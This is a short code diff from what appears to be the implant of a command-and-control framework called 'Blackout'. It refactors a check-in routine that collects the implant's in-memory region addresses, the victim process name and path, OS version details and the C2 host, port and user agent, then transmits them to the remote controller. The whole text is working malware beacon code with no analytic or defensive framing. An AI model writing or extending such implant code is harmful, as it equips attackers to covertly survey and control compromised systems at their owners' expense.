@@ -306,11 +306,10 @@ FUNC VOID CommandCheckin(
 
     BK_PACKAGE = PackageCreate( BLACKOUT_CHECKIN );
 
-    PackageAddInt64( BK_PACKAGE, Instance()->Base.Buffer  );
-    PackageAddInt32( BK_PACKAGE, Instance()->Base.Length  );
-    PackageAddInt32( BK_PACKAGE, Instance()->Base.FullLen );
-    PackageAddInt64( BK_PACKAGE, Instance()->Base.RxBase  );
-    PackageAddInt32( BK_PACKAGE, Instance()->Base.RxSize  );
+    PackageAddInt64( BK_PACKAGE, Blackout().Region.Base  );
+    PackageAddInt64( BK_PACKAGE, Blackout().Region.Length  );
+    PackageAddInt64( BK_PACKAGE, Blackout().RxRegion.Base  );
+    PackageAddInt32( BK_PACKAGE, Blackout().RxRegion.Length  );
 
     PackageAddWString( BK_PACKAGE, Instance()->Session.ProcessName     );
     PackageAddWString( BK_PACKAGE, Instance()->Session.ProcessFullPath );
@@ -330,9 +329,9 @@ FUNC VOID CommandCheckin(
     PackageAddInt32(  BK_PACKAGE, Instance()->System.OsMinorv      );
     PackageAddInt32(  BK_PACKAGE, Instance()->System.OsBuildNumber );
 
-    PackageAddWString( BK_PACKAGE, Instance()->Transport.Host      );
-    PackageAddInt32(   BK_PACKAGE, Instance()->Transport.Port      );
-    PackageAddWString( BK_PACKAGE, Instance()->Transport.UserAgent );
+    PackageAddWString( BK_PACKAGE, Transport().Http.Host      );
+    PackageAddInt32(   BK_PACKAGE, Transport().Http.Port      );
+    PackageAddWString( BK_PACKAGE, Transport().Http.UserAgent );
 
     PackageTransmit( BK_PACKAGE, NULL, NULL );
 }
